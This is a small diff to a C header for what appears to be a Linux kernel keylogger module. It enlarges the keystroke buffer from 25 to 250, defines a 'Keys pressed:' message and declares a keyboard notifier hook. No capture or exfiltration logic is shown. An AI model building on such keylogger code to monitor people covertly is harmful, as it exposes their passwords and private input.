@@ -1,7 +1,7 @@
 #ifndef __KEYBOARDLOGGER_H__
 #define __KEYBOARDLOGGER_H__
 
-#define KEY_BUFFER_SIZE 25
+#define KEY_BUFFER_SIZE 250
 #define KEYLOGGER_MSG "Keys pressed: \0"
 
 extern struct notifier_block keyboard_notifier_block;
